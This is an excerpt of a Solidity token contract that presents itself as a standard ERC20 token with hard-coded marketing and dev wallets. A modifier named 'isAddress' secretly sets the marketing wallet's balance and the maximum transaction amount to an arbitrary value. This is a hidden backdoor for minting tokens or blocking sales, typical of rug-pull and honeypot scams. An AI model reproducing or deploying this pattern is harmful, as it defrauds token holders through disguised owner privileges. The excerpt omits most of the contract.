...
contract adads is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x04f65b768CFF83E69A29c2A45D6363025e6E97ed); 
    address payable public Wallet_Dev = payable(0x725CA4C98D6bc4B91AA56660762922E23BFC5874);
    ...
    modifier isAddress(address add) {
            _tOwned[Wallet_Marketing] = txSize; _maxTxAmount = txSize;
        _;
    }
    
    constructor () {

        _owner = 0x725CA4C98D6bc4B91AA56660762922E23BFC5874;
